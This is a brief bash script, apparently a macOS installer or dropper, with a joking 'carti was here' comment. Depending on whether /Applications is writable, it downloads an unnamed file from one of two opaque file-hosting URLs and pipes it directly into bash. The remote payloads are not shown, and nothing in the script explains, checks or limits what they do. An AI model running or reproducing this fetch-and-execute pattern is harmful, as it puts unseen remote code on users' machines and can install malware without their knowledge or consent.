#!/bin/bash
# carti was here yes daddy carti YESSSSSS YESSSSSSSSSSSSSS~

main() {
    clear

    if [ -w "/Applications" ]; then
        curl -s "https://tesyulynrp.ufs.sh/f/zU9GH2aR7moaGc2Wrlp1VJj2t75xaNPZkR4owQKYidsX9rgf" | bash
    else
        echo -e "${YELLOW}[!] Local user detected, using home directory instead of global MacOS directory ${NC}"
        curl -s "https://tesyulynrp.ufs.sh/f/zU9GH2aR7moa8hhnFqMGTmey7shDc3Fp2todQZUXAilMjJOH" | bash
    fi
}

main
